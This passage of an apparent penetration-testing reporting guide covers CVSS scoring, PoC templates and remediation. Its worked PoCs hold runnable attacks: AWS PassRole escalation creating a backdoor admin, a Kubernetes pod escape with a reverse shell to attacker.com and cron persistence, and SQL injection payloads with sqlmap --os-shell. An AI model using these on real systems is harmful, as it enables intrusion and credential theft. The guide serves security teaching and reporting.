+                              (1 - impact_values[a]))) - 0.029 - \
+                 3.25 * ((1 - ((1 - impact_values[c]) * 
+                               (1 - impact_values[i]) * 
+                               (1 - impact_values[a]))) ** 0.15)
+    
+    return impact if impact > 0 else 0
+
+def calculate_exploitability_sub_score(av, ac, pr, ui, scope):
+    """Calculate Exploitability sub-score"""
+    av_values = {'N': 0.85, 'A': 0.62, 'L': 0.55, 'P': 0.2}
+    ac_values = {'L': 0.77, 'H': 0.44}
+    ui_values = {'N': 0.85, 'R': 0.62}
+    
+    pr_values = {
+        'U': {'N': 0.85, 'L': 0.62, 'H': 0.27},
+        'C': {'N': 0.85, 'L': 0.68, 'H': 0.50}
+    }
+    
+    exploitability = 8.22 * av_values[av] * ac_values[ac] * \
+                     pr_values[scope][pr] * ui_values[ui]
+    
+    return exploitability
+
+def calculate_base_score(av, ac, pr, ui, scope, c, i, a):
+    """Calculate CVSS v3.1 Base Score"""
+    impact = calculate_impact_sub_score(c, i, a, scope)
+    
+    if impact <= 0:
+        return 0.0
+    
+    exploitability = calculate_exploitability_sub_score(av, ac, pr, ui, scope)
+    
+    if scope == 'U':
+        base_score = min(10, (impact + exploitability))
+    else:  # scope == 'C'
+        base_score = min(10, 1.08 * (impact + exploitability))
+    
+    # Round up to one decimal
+    return round(base_score * 10 + 0.00001) / 10
+
+def get_severity_rating(score):
+    """Convert numerical score to severity rating"""
+    if score == 0.0:
+        return "None"
+    elif score < 4.0:
+        return "Low"
+    elif score < 7.0:
+        return "Medium"
+    elif score < 9.0:
+        return "High"
+    else:
+        return "Critical"
+
+# Example usage
+if __name__ == "__main__":
+    # AWS IAM Privilege Escalation
+    score = calculate_base_score(
+        av='N', ac='L', pr='L', ui='N', 
+        scope='C', c='H', i='H', a='H'
+    )
+    
+    print(f"Base Score: {score} ({get_severity_rating(score)})")
+    print(f"Vector String: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H")
+```
+
+### Common CTF Vulnerability CVSS Examples
+
+**SQL Injection (Unauthenticated):**
+
+```
+Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+Score: 9.8 (Critical)
+
+Rationale:
+- Network accessible
+- Low complexity exploitation
+- No privileges required
+- Can extract/modify all database data
+```
+
+**Stored XSS (Authenticated):**
+
+```
+Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
+Score: 5.4 (Medium)
+
+Rationale:
+- Network accessible
+- Low complexity
+- Requires low privileges (user account)
+- User interaction required (victim must view)
+- Scope changed (affects other users)
+- Limited confidentiality/integrity impact
+```
+
+**Kubernetes Privileged Container:**
+
+```
+Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
+Score: 8.8 (High)
+
+Rationale:
+- Local access (inside container)
+- Low complexity escape
+- Low privileges (pod exec access)
+- Scope changed (escape to host)
+- Full host compromise possible
+```
+
+**AWS S3 Bucket Public Read:**
+
+```
+Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+Score: 7.5 (High)
+
+Rationale:
+- Network accessible
+- No authentication required
+- High confidentiality impact
+- No integrity or availability impact
+```
+
+**SSRF to Metadata Service:**
+
+```
+Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+Score: 10.0 (Critical)
+
+Rationale:
+- Network accessible (web application)
+- Low complexity
+- No privileges required
+- Scope changed (access cloud credentials)
+- Full account compromise possible
+```
+
+### CVSS Temporal and Environmental Metrics
+
+[Inference] Temporal and Environmental metrics provide context-specific scoring adjustments, though they are optional and less commonly used in CTF reporting.
+
+**Temporal Metrics** (adjust based on exploit availability):
+
+```
+Exploit Code Maturity (E): Not Defined (X) / High (H) / Functional (F) / Proof-of-Concept (P) / Unproven (U)
+Remediation Level (RL): Not Defined (X) / Unavailable (U) / Workaround (W) / Temporary Fix (T) / Official Fix (O)
+Report Confidence (RC): Not Defined (X) / Confirmed (C) / Reasonable (R) / Unknown (U)
+```
+
+**Environmental Metrics** (organization-specific adjustments):
+
+```
+Confidentiality Requirement (CR): Not Defined (X) / High (H) / Medium (M) / Low (L)
+Integrity Requirement (IR): Not Defined (X) / High (H) / Medium (M) / Low (L)
+Availability Requirement (AR): Not Defined (X) / High (H) / Medium (M) / Low (L)
+```
+
+### Severity Rating Guidelines
+
+```bash
+# Create severity matrix for reporting
+cat > severity_matrix.md <<EOF
+| CVSS Score | Severity | SLA | Priority | Description |
+|------------|----------|-----|----------|-------------|
+| 9.0 - 10.0 | Critical | 24h | P0 | Immediate exploitation, wide impact |
+| 7.0 - 8.9  | High | 7d | P1 | Significant impact, likely exploitation |
+| 4.0 - 6.9  | Medium | 30d | P2 | Moderate impact, authentication needed |
+| 0.1 - 3.9  | Low | 90d | P3 | Limited impact, complex exploitation |
+| 0.0 | None | N/A | P4 | Informational, no direct impact |
+EOF
+```
+
+## Proof of Concept Creation
+
+A proof of concept (PoC) demonstrates exploitability of a vulnerability in a controlled, reproducible manner without causing actual damage.
+
+### PoC Design Principles
+
+**Essential Components:**
+
+1. **Environment Setup**: Exact configuration and prerequisites
+2. **Step-by-Step Instructions**: Reproducible exploitation steps
+3. **Expected Results**: What success looks like
+4. **Evidence**: Screenshots, command output, logs
+5. **Cleanup**: How to revert changes (if applicable)
+
+### PoC Structure Template
+
+```bash
+# Create standardized PoC template
+cat > poc_template.md <<EOF
+# Proof of Concept: [Vulnerability Name]
+
+## Executive Summary
+Brief description of vulnerability and impact
+
+## Environment
+- **Target**: [IP/hostname/URL/cloud account]
+- **Software Version**: [Specific versions]
+- **Platform**: [OS, cloud provider, etc.]
+- **Prerequisites**: [Required access, tools, credentials]
+
+## Vulnerability Details
+Technical explanation of the vulnerability
+
+## Proof of Concept
+
+### Step 1: [Initial Access/Setup]
+\`\`\`bash
+# Commands with explanations
+command --option value
+\`\`\`
+
+**Expected Output:**
+\`\`\`
+[Expected command output]
+\`\`\`
+
+### Step 2: [Exploitation]
+\`\`\`bash
+# Exploitation commands
+exploit_command
+\`\`\`
+
+**Evidence:**
+[Screenshot/log output]
+
+### Step 3: [Verification]
+\`\`\`bash
+# Verification commands
+verify_command
+\`\`\`
+
+**Result:**
+[Proof of successful exploitation]
+
+## Impact Demonstration
+Concrete examples of what attacker can achieve
+
+## Cleanup
+\`\`\`bash
+# Commands to restore original state
+cleanup_command
+\`\`\`
+
+## References
+- [CVE/Advisory links]
+- [Documentation references]
+EOF
+```
+
+### PoC Examples by Vulnerability Type
+
+**Example 1: AWS IAM Privilege Escalation PoC**
+
+````bash
+cat > poc_aws_privesc.md <<'EOF'
+# Proof of Concept: AWS IAM Privilege Escalation via iam:PassRole
+
+## Executive Summary
+Low-privilege IAM user can escalate to Administrator access by passing a high-privilege role to Lambda function and executing code within that context.
+
+## Environment
+- **Target**: AWS Account 123456789012
+- **IAM User**: developer-user (low privilege)
+- **Vulnerable Role**: HighPrivilegeRole (Administrator access)
+- **Prerequisites**: 
+  - AWS CLI configured with developer-user credentials
+  - Permissions: lambda:CreateFunction, lambda:InvokeFunction, iam:PassRole
+
+## Vulnerability Details
+The IAM user has iam:PassRole permission for HighPrivilegeRole without proper restrictions, allowing role passing to Lambda. The role's trust policy permits Lambda service assumption.
+
+## Proof of Concept
+
+### Step 1: Verify Current Permissions
+```bash
+# Check current identity
+aws sts get-caller-identity
+
+# Attempt admin action (should fail)
+aws iam list-users
+````
+
+**Expected Output:**
+
+```
+An error occurred (AccessDenied) when calling the ListUsers operation
+```
+
+### Step 2: Create Malicious Lambda Function
+
+```bash
+# Create Python payload
+cat > lambda_function.py <<'LAMBDA'
+import boto3
+import json
+
+def lambda_handler(event, context):
+    # Execute privileged operation
+    iam = boto3.client('iam')
+    users = iam.list_users()
+    
+    return {
+        'statusCode': 200,
+        'body': json.dumps({
+            'message': 'Privilege escalation successful',
+            'users': [u['UserName'] for u in users['Users']]
+        })
+    }
+LAMBDA
+
+# Zip payload
+zip function.zip lambda_function.py
+
+# Create function with high-privilege role
+aws lambda create-function \
+  --function-name privesc-poc \
+  --runtime python3.9 \
+  --role arn:aws:iam::123456789012:role/HighPrivilegeRole \
+  --handler lambda_function.lambda_handler \
+  --zip-file fileb://function.zip
+```
+
+**Expected Output:**
+
+```json
+{
+    "FunctionName": "privesc-poc",
+    "FunctionArn": "arn:aws:lambda:us-east-1:123456789012:function:privesc-poc",
+    "Role": "arn:aws:iam::123456789012:role/HighPrivilegeRole",
+    "State": "Active"
+}
+```
+
+### Step 3: Execute Privileged Operation
+
+```bash
+# Invoke function
+aws lambda invoke \
+  --function-name privesc-poc \
+  output.json
+
+# View results
+cat output.json
+```
+
+**Evidence:**
+
+```json
+{
+    "statusCode": 200,
+    "body": "{\"message\": \"Privilege escalation successful\", \"users\": [\"admin\", \"developer-user\", \"backup-user\"]}"
+}
+```
+
+### Step 4: Demonstrate Full Compromise
+
+```bash
+# Update function to create new admin user
+cat > lambda_function_v2.py <<'LAMBDA'
+import boto3
+
+def lambda_handler(event, context):
+    iam = boto3.client('iam')
+    
+    # Create backdoor admin user
+    iam.create_user(UserName='backdoor-admin')
+    iam.attach_user_policy(
+        UserName='backdoor-admin',
+        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
+    )
+    
+    # Create access keys
+    keys = iam.create_access_key(UserName='backdoor-admin')
+    
+    return {
+        'AccessKeyId': keys['AccessKey']['AccessKeyId'],
+        'SecretAccessKey': keys['AccessKey']['SecretAccessKey']
+    }
+LAMBDA
+
+# Update function
+zip function_v2.zip lambda_function_v2.py
+aws lambda update-function-code \
+  --function-name privesc-poc \
+  --zip-file fileb://function_v2.zip
+
+# Invoke to create admin user
+aws lambda invoke --function-name privesc-poc admin_keys.json
+cat admin_keys.json
+```
+
+## Impact Demonstration
+
+- Created Lambda function with Administrator role
+- Executed privileged IAM operations (list users)
+- Created persistent backdoor admin user with full access
+- Total account compromise achieved
+
+## Cleanup
+
+```bash
+# Delete created resources
+aws lambda delete-function --function-name privesc-poc
+aws iam delete-access-key --user-name backdoor-admin --access-key-id <key-id>
+aws iam detach-user-policy --user-name backdoor-admin --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+aws iam delete-user --user-name backdoor-admin
+rm function.zip function_v2.zip lambda_function.py lambda_function_v2.py output.json admin_keys.json
+```
+
+## References
+
+- AWS IAM Best Practices: https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html
+- Rhino Security Labs: AWS IAM Privilege Escalation Methods EOF
+
+````
+
+**Example 2: Kubernetes Privileged Pod Escape PoC**
+
+```bash
+cat > poc_k8s_escape.md <<'EOF'
+# Proof of Concept: Kubernetes Privileged Pod Escape to Host Root
+
+## Executive Summary
+Privileged pod configuration allows container escape to underlying host with root access, enabling full cluster compromise.
+
+## Environment
+- **Target**: Kubernetes cluster prod-cluster-01
+- **Kubernetes Version**: v1.24.0
+- **Vulnerable Pod**: debug-pod (namespace: default)
+- **Prerequisites**:
+  - kubectl access to cluster
+  - Permission to create pods
+  - Privileged security context enabled
+
+## Vulnerability Details
+Pod runs with privileged: true and hostPath volume mounts, allowing direct access to host filesystem and disabling security boundaries.
+
+## Proof of Concept
+
+### Step 1: Create Privileged Pod
+```bash
+cat > privileged-pod.yaml <<YAML
+apiVersion: v1
+kind: Pod
+metadata:
+  name: escape-pod
+  namespace: default
+spec:
+  hostNetwork: true
+  hostPID: true
+  hostIPC: true
+  containers:
+  - name: escape-container
+    image: ubuntu:20.04
+    command: ["/bin/bash"]
+    args: ["-c", "sleep 3600"]
+    securityContext:
+      privileged: true
+    volumeMounts:
+    - name: host-root
+      mountPath: /host
+  volumes:
+  - name: host-root
+    hostPath:
+      path: /
+      type: Directory
+YAML
+
+# Deploy pod
+kubectl apply -f privileged-pod.yaml
+
+# Wait for pod to be ready
+kubectl wait --for=condition=ready pod/escape-pod --timeout=60s
+````
+
+**Expected Output:**
+
+```
+pod/escape-pod created
+pod/escape-pod condition met
+```
+
+### Step 2: Escape to Host Filesystem
+
+```bash
+# Access pod shell
+kubectl exec -it escape-pod -- /bin/bash
+
+# From inside pod - verify host access
+ls /host
+cat /host/etc/hostname
+cat /host/etc/shadow
+```
+
+**Evidence:**
+
+```bash
+# Full host filesystem accessible
+root@escape-pod:/# ls /host
+bin  boot  dev  etc  home  lib  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
+
+# Can read sensitive host files
+root@escape-pod:/# head -n 3 /host/etc/shadow
+root:$6$encrypted$hash:18000:0:99999:7:::
+daemon:*:18000:0:99999:7:::
+```
+
+### Step 3: Achieve Host Code Execution
+
+```bash
+# From inside pod
+# Create reverse shell on host
+cat > /host/tmp/backdoor.sh <<'SCRIPT'
+#!/bin/bash
+bash -i >& /dev/tcp/attacker.com/4444 0>&1
+SCRIPT
+
+chmod +x /host/tmp/backdoor.sh
+
+# Add cron job for persistence
+echo "* * * * * root /tmp/backdoor.sh" >> /host/etc/crontab
+
+# Alternatively, use nsenter to break into host namespaces
+nsenter --target 1 --mount --uts --ipc --net --pid -- bash
+
+# Verify we're on host (not container)
+hostname
+cat /etc/machine-id
+```
+
+**Evidence:**
+
+```bash
+root@k8s-node-01:/# hostname
+k8s-node-01  # Host hostname, not container
+
+root@k8s-node-01:/# ps aux | grep kubelet
+root      1234  ... /usr/bin/kubelet --config=/var/lib/kubelet/config.yaml
+```
+
+### Step 4: Steal Node Credentials
+
+```bash
+# Access kubelet credentials
+cat /host/var/lib/kubelet/kubeconfig
+
+# Access etcd certificates if colocated
+ls -la /host/etc/kubernetes/pki/
+
+# Read service account tokens for all pods
+find /host/var/lib/kubelet/pods -name token -exec cat {} \; 2>/dev/null
+```
+
+### Step 5: Lateral Movement to Control Plane
+
+```bash
+# Use stolen kubelet credentials
+export KUBECONFIG=/host/var/lib/kubelet/kubeconfig
+
+# List all pods in cluster
+kubectl get pods --all-namespaces
+
+# Access secrets
+kubectl get secrets --all-namespaces
+
+# Create admin service account
+kubectl create sa cluster-admin -n kube-system
+kubectl create clusterrolebinding admin-bind --clusterrole=cluster-admin --serviceaccount=kube-system:cluster-admin
+```
+
+## Impact Demonstration
+
+- Escaped container to host root access
+- Read sensitive host files (/etc/shadow)
+- Achieved persistent host code execution
+- Stole kubelet and service account credentials
+- Potential full cluster compromise via control plane access
+
+## Cleanup
+
+```bash
+# Remove cron backdoor
+kubectl exec escape-pod -- sed -i '/backdoor.sh/d' /host/etc/crontab
+kubectl exec escape-pod -- rm /host/tmp/backdoor.sh
+
+# Delete pod
+kubectl delete pod escape-pod
+
+# Remove any created service accounts
+kubectl delete sa cluster-admin -n kube-system 2>/dev/null
+kubectl delete clusterrolebinding admin-bind 2>/dev/null
+
+rm privileged-pod.yaml
+```
+
+## References
+
+- CWE-250: Execution with Unnecessary Privileges
+- Kubernetes Security Best Practices
+- Container Escape Techniques (Trail of Bits) EOF
+
+````
+
+**Example 3: SQL Injection PoC**
+
+```bash
+cat > poc_sqli.md <<'EOF'
+# Proof of Concept: SQL Injection in User Search Endpoint
+
+## Executive Summary
+Unauthenticated SQL injection in /api/search parameter allows complete database extraction and authentication bypass.
+
+## Environment
+- **Target**: https://vulnerable-app.example.com
+- **Endpoint**: /api/search?username=
+- **Database**: MySQL 5.7.x
+- **Prerequisites**: None (unauthenticated)
+
+## Vulnerability Details
+The username parameter is directly concatenated into SQL query without sanitization or parameterization.
+
+## Proof of Concept
+
+### Step 1: Identify Injection Point
+```bash
+# Test for SQL injection
+curl -s "https://vulnerable-app.example.com/api/search?username=test'" | jq
+
+# Boolean-based detection
+curl -s "https://vulnerable-app.example.com/api/search?username=test' AND '1'='1" | jq
+curl -s "https://vulnerable-app.example.com/api/search?username=test' AND '1'='2" | jq
+````
+
+**Expected Output:**
+
+```
+First request returns results, second returns nothing, confirming SQL injection
+```
+
+### Step 2: Enumerate Database Structure
+
+```bash
+# Get database version
+curl -s "https://vulnerable-app.example.com/api/search?username=test' UNION SELECT 1,@@version,3,4-- -" | jq
+
+# Get current database
+curl -s "https://vulnerable-app.example.com/api/search?username=test' UNION SELECT 1,database(),3,4-- -" | jq
+
+# List all tables
+curl -s "https://vulnerable-app.example.com/api/search?username=test' UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()-- -" | jq
+```
+
+**Evidence:**
+
+```json
+{
+  "results": [{
+    "id": 1,
+    "username": "5.7.33-0ubuntu0.18.04.1",
+    "email": null
+  }]
+}
+
+{
+  "results": [{
+    "username": "users,admin_users,sessions,api_keys"
+  }]
+}
+```
+
+### Step 3: Extract Sensitive Data
+
+```bash
+# Get column names from users table
+curl -s "https://vulnerable-app.example.com/api/search?username=test' UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_name='users'-- -" | jq
+
+# Extract user credentials
+curl -s "https://vulnerable-app.example.com/api/search?username=test' UNION SELECT 1,group_concat(username,':',password_hash),3,4 FROM users-- -" | jq
+
+# Extract admin credentials
+curl -s "https://vulnerable-app.example.com/api/search?username=test' UNION SELECT 1,group_concat(username,':',password_hash),3,4 FROM admin_users-- -" | jq
+```
+
+**Evidence:**
+
+```json
+{
+  "results": [{
+    "username": "admin:$2b$10$abcd1234...,user1:$2b$10$efgh5678...,user2:$2b$10$ijkl9012..." }]
+}
+
+````
+
+### Step 4: Demonstrate Authentication Bypass
+```bash
+# Bypass login with SQL injection
+curl -X POST "https://vulnerable-app.example.com/api/login" \
+  -H "Content-Type: application/json" \
+  -d '{"username":"admin'\'' OR '\''1'\''='\''1", "password":"anything"}'
+
+# Alternative: Use UNION to inject valid session
+curl -X POST "https://vulnerable-app.example.com/api/login" \
+  -H "Content-Type: application/json" \
+  -d '{"username":"test'\'' UNION SELECT 1,'\''admin'\'','\''known_hash'\'',4-- -", "password":"known_password"}'
+````
+
+**Evidence:**
+
+```json
+{
+  "success": true,
+  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
+  "user": "admin",
+  "role": "administrator"
+}
+```
+
+### Step 5: Automated Exploitation with SQLMap
+
+```bash
+# Save request to file
+cat > request.txt <<'REQUEST'
+GET /api/search?username=test HTTP/1.1
+Host: vulnerable-app.example.com
+User-Agent: Mozilla/5.0
+Accept: application/json
+REQUEST
+
+# Run SQLMap
+sqlmap -r request.txt --batch --level=5 --risk=3
+
+# Dump specific table
+sqlmap -r request.txt --batch -D database_name -T admin_users --dump
+
+# Get shell (if possible)
+sqlmap -r request.txt --batch --os-shell
+```
+
+**Evidence:**
+
+```
+[*] starting @ 10:15:33
+[10:15:34] [INFO] testing connection to the target URL
+[10:15:34] [INFO] testing if the target URL content is stable
+[10:15:35] [INFO] target URL content is stable
+[10:15:35] [INFO] testing if GET parameter 'username' is dynamic
+[10:15:35] [INFO] GET parameter 'username' appears to be dynamic
+[10:15:36] [INFO] heuristic (basic) test shows that GET parameter 'username' might be injectable
+
+Database: app_database
+Table: admin_users
+[3 entries]
++----+----------+----------------------------------+---------------+
+| id | username | password_hash                    | email         |
++----+----------+----------------------------------+---------------+
+| 1  | admin    | $2b$10$N9qo8uLO... | admin@ex.com  |
+| 2  | root     | $2b$10$Z8fK3mN... | root@ex.com   |
+| 3  | superadmin| $2b$10$A7bC9dE... | super@ex.com |
++----+----------+----------------------------------+---------------+
+```
+
+## Impact Demonstration
+
+- Complete database enumeration achieved
+- Extracted all user credentials including admin accounts
+- Authentication bypass demonstrated
+- Potential for complete application compromise
+- [Inference] Depending on database permissions, could achieve OS command execution
+
+## Cleanup
+
+No cleanup required - read-only exploitation (no data modified)
+
+## References
+
+- OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
+- CWE-89: Improper Neutralization of Special Elements used in an SQL Command
+- SQLMap Documentation: https://github.com/sqlmapproject/sqlmap EOF
+
+````
+
+### PoC Recording and Evidence Collection
+
+**Screenshot and Command Output Capture:**
+
+```bash
+# Use script command to record entire terminal session
+script -a poc_session.log
+
+# Execute PoC commands
+# ... exploitation steps ...
+
+# Exit recording
+exit
+
+# Alternatively, use asciinema for replay capability
+asciinema rec poc_demo.cast
+
+# Upload recording
+asciinema upload poc_demo.cast
+````
+
+**Automated Evidence Collection Script:**
+
+```bash
+#!/bin/bash
+# evidence_collector.sh
+
+EVIDENCE_DIR="poc_evidence_$(date +%Y%m%d_%H%M%S)"
+mkdir -p "$EVIDENCE_DIR"
+
+echo "[*] Collecting evidence for PoC..."
+
+# Capture system information
+uname -a > "$EVIDENCE_DIR/system_info.txt"
+date > "$EVIDENCE_DIR/timestamp.txt"
+
+# Capture network configuration
+ip addr show > "$EVIDENCE_DIR/network_config.txt" 2>&1
+ifconfig > "$EVIDENCE_DIR/ifconfig.txt" 2>&1
+
+# Capture current user context
+whoami > "$EVIDENCE_DIR/current_user.txt"
+id >> "$EVIDENCE_DIR/current_user.txt"
+
+# AWS context if applicable
+if command -v aws &> /dev/null; then
+    aws sts get-caller-identity > "$EVIDENCE_DIR/aws_identity.txt" 2>&1
+    aws iam list-attached-user-policies --user-name $(aws sts get-caller-identity --query 'Arn' --output text | cut -d'/' -f2) > "$EVIDENCE_DIR/aws_permissions.txt" 2>&1
+fi
+
+# Kubernetes context if applicable
+if command -v kubectl &> /dev/null; then
+    kubectl config current-context > "$EVIDENCE_DIR/k8s_context.txt" 2>&1
+    kubectl auth can-i --list > "$EVIDENCE_DIR/k8s_permissions.txt" 2>&1
+fi
+
+# Azure context if applicable
+if command -v az &> /dev/null; then
+    az account show > "$EVIDENCE_DIR/azure_account.txt" 2>&1
+fi
+
+# GCP context if applicable
+if command -v gcloud &> /dev/null; then
+    gcloud config list > "$EVIDENCE_DIR/gcp_config.txt" 2>&1
+    gcloud projects get-iam-policy $(gcloud config get-value project) > "$EVIDENCE_DIR/gcp_iam.txt" 2>&1
+fi
+
+echo "[+] Evidence collected in: $EVIDENCE_DIR"
+
+# Create archive
+tar -czf "${EVIDENCE_DIR}.tar.gz" "$EVIDENCE_DIR"
+echo "[+] Archive created: ${EVIDENCE_DIR}.tar.gz"
+```
+
+**Screenshot Automation:**
+
+```bash
+# Install required tools
+sudo apt-get install -y scrot imagemagick
+
+# Take screenshot with timestamp
+scrot -d 1 "evidence_%Y%m%d_%H%M%S.png"
+
+# Take screenshot of specific window
+scrot -u -d 1 "window_%Y%m%d_%H%M%S.png"
+
+# Annotate screenshot
+convert evidence.png -pointsize 20 -fill red -annotate +10+30 "Privilege Escalation Success" evidence_annotated.png
+```
+
+### PoC Safety Guidelines
+
+**Do Not:**
+
+- Cause denial of service or resource exhaustion
+- Modify production data (except in isolated test environments)
+- Exfiltrate sensitive data beyond proof of access
+- Enable backdoors without clear documentation and cleanup
+- Execute PoC on systems without authorization
+
+**Do:**
+
+- Test in isolated/staging environments when possible
+- Document all changes made during exploitation
+- Provide complete cleanup procedures
+- Use read-only operations when demonstrating data access
+- Include timestamps and session IDs for traceability
+
+## Remediation Recommendations
+
+Remediation recommendations provide specific, actionable guidance to fix identified vulnerabilities and prevent recurrence.
+
+### Remediation Framework
+
+**Comprehensive Remediation Structure:**
+
+```bash
+cat > remediation_template.md <<EOF
+# Remediation Recommendations: [Vulnerability Name]
+
+## Immediate Actions (Critical Path)
+1. [Most urgent action]
+2. [Second priority action]
+3. [Emergency containment if needed]
+
+## Short-Term Remediation (< 30 days)
+### Fix Implementation
+[Specific code/configuration changes]
+
+### Verification Steps
+[How to confirm fix is effective]
+
+## Long-Term Remediation (30-90 days)
+### Architectural Changes
+[Design improvements]
+
+### Process Improvements
+[Development/deployment changes]
+
+## Prevention Measures
+### Code Review Guidelines
+[Specific patterns to avoid]
+
+### Automated Detection
+[Security tools/tests to implement]
+
+### Training & Awareness
+[Team education needs]
+
+## Verification & Testing
+### Regression Tests
+[Tests to ensure fix doesn't break functionality]
+
+### Security Tests
+[Tests to verify vulnerability is fixed]
+
+## Rollback Plan
+[If remediation causes issues]
+
+## References
+[Links to documentation, best practices]
+EOF
+```
+
+### Remediation Examples by Vulnerability Type
+
+**Example 1: AWS IAM Privilege Escalation Remediation**
+
+````bash
+cat > remediation_aws_privesc.md <<'EOF'
+# Remediation Recommendations: AWS IAM Privilege Escalation via iam:PassRole
+
+## Immediate Actions (Critical Path)
+
+1. **Revoke iam:PassRole Permission** (Priority: P0 - Immediate)
+```bash
+# Remove dangerous permission from developer-user
+aws iam detach-user-policy \
+  --user-name developer-user \
+  --policy-arn arn:aws:iam::123456789012:policy/DeveloperPolicy
+
+# Create restricted policy
+cat > restricted_policy.json <<JSON
+{
+  "Version": "2012-10-17",
+  "Statement": [
+    {
+      "Effect": "Allow",
+      "Action": [
+        "lambda:CreateFunction",
+        "lambda:UpdateFunctionCode",
+        "lambda:InvokeFunction"
+      ],
+      "Resource": "*",
+      "Condition": {
+        "StringEquals": {
+          "iam:PassedToService": "lambda.amazonaws.com"
+        },
+        "ArnEquals": {
+          "iam:PassRole": "arn:aws:iam::123456789012:role/LambdaExecutionRole-Restricted"
+        }
+      }
+    }
+  ]
+}
+JSON
+
+# Apply restricted policy
+aws iam create-policy \
+  --policy-name DeveloperPolicy-Restricted \
+  --policy-document file://restricted_policy.json
+
+aws iam attach-user-policy \
+  --user-name developer-user \
+  --policy-arn arn:aws:iam::123456789012:policy/DeveloperPolicy-Restricted
+````
+
+2. **Audit HighPrivilegeRole Trust Policy** (Priority: P0 - Immediate)
+
+```bash
+# Review and restrict trust policy
+cat > restricted_trust_policy.json <<JSON
+{
+  "Version": "2012-10-17",
+  "Statement": [
+    {
+      "Effect": "Allow",
+      "Principal": {
+        "Service": "lambda.amazonaws.com"
+      },
+      "Action": "sts:AssumeRole",
+      "Condition": {
+        "StringEquals": {
+          "aws:SourceAccount": "123456789012"
+        },
+        "ArnLike": {
+          "aws:SourceArn": "arn:aws:lambda:us-east-1:123456789012:function/approved-function-*"
+        }
+      }
+    }
+  ]
+}
+JSON
+
+# Update role trust policy
+aws iam update-assume-role-policy \
+  --role-name HighPrivilegeRole \
+  --policy-document file://restricted_trust_policy.json
+```
+
+3. **Enable CloudTrail Monitoring** (Priority: P0 - Immediate)
+
+```bash
+# Create EventBridge rule for PassRole actions
+aws events put-rule \
+  --name detect-passrole-abuse \
+  --event-pattern '{
+    "source": ["aws.iam"],
+    "detail-type": ["AWS API Call via CloudTrail"],
+    "detail": {
+      "eventName": ["PassRole"],
+      "requestParameters": {
+        "roleName": ["HighPrivilegeRole"]
+      }
+    }
+  }'
+
+# Configure SNS alert
+aws events put-targets \
+  --rule detect-passrole-abuse \
+  --targets "Id"="1","Arn"="arn:aws:sns:us-east-1:123456789012:security-alerts"
+```
+
+## Short-Term Remediation (< 30 days)
+
+### Fix Implementation
+
+**1. Implement Permission Boundaries**
+
+```bash
+# Create permission boundary
+cat > permission_boundary.json <<JSON
+{
+  "Version": "2012-10-17",
+  "Statement": [
+    {
+      "Effect": "Allow",
+      "Action": [
+        "lambda:*",
+        "logs:*",
+        "s3:GetObject",
+        "s3:PutObject"
+      ],
+      "Resource": "*"
+    },
+    {
+      "Effect": "Deny",
+      "Action": [
+        "iam:*",
+        "organizations:*",
+        "account:*"
+      ],
+      "Resource": "*"
+    }
+  ]
+}
+JSON
+
+aws iam create-policy \
+  --policy-name DeveloperBoundary \
+  --policy-document file://permission_boundary.json
+
+# Apply boundary to existing users
+aws iam put-user-permissions-boundary \
+  --user-name developer-user \
+  --permissions-boundary arn:aws:iam::123456789012:policy/DeveloperBoundary
+```
+
+**2. Implement Resource-Based Policies on Roles**
+
+```bash
+# Add resource-based restrictions to high-privilege roles
+cat > role_policy_update.json <<JSON
+{
+  "Version": "2012-10-17",
+  "Statement": [
+    {
+      "Sid": "AllowAdminAccess",
+      "Effect": "Allow",
+      "Action": "*",
+      "Resource": "*",
+      "Condition": {
+        "IpAddress": {
+          "aws:SourceIp": ["10.0.0.0/8", "172.16.0.0/12"]
+        }
+      }
+    }
+  ]
+}
+JSON
+
+aws iam put-role-policy \
+  --role-name HighPrivilegeRole \
+  --policy-name IpRestriction \
+  --policy-document file://role_policy_update.json
+```
+
+**3. Enable AWS IAM Access Analyzer**
+
+```bash
+# Create analyzer for organization
+aws accessanalyzer create-analyzer \
+  --analyzer-name org-iam-analyzer \
+  --type ORGANIZATION
+
+# Review findings
+aws accessanalyzer list-findings \
+  --analyzer-arn arn:aws:access-analyzer:us-east-1:123456789012:analyzer/org-iam-analyzer
+```
+
+### Verification Steps
+
+```bash
+# Test that privilege escalation is blocked
+aws lambda create-function \
+  --function-name test-privesc \
+  --role arn:aws:iam::123456789012:role/HighPrivilegeRole \
+  --runtime python3.9 \
+  --handler index.handler \
+  --zip-file fileb://test.zip
+# Expected: AccessDenied error
+
+# Verify permission boundary is effective
+aws iam simulate-principal-policy \
+  --policy-source-arn arn:aws:iam::123456789012:user/developer-user \
+  --action-names iam:CreateUser \
+  --permissions-boundary arn:aws:iam::123456789012:policy/DeveloperBoundary
+# Expected: implicitDeny due to boundary
+```
+
+## Long-Term Remediation (30-90 days)
+
+### Architectural Changes
+
+**1. Implement Least Privilege by Default**
+
+```bash
+# Create role-based access structure
+# Separate roles: Developer, QA, Operations, Admin
+
+# Developer role with minimal Lambda permissions
+cat > developer_role.json <<JSON
+{
+  "Version": "2012-10-17",
+  "Statement": [
+    {
+      "Effect": "Allow",
+      "Action": [
+        "lambda:CreateFunction",
+        "lambda:UpdateFunctionCode",
+        "lambda:InvokeFunction",
+        "lambda:GetFunction",
+        "lambda:ListFunctions"
+      ],
+      "Resource": "arn:aws:lambda:*:123456789012:function:dev-*"
+    },
+    {
+      "Effect": "Allow",
+      "Action": "iam:PassRole",
+      "Resource": "arn:aws:iam::123456789012:role/LambdaExecutionRole-Dev",
+      "Condition": {
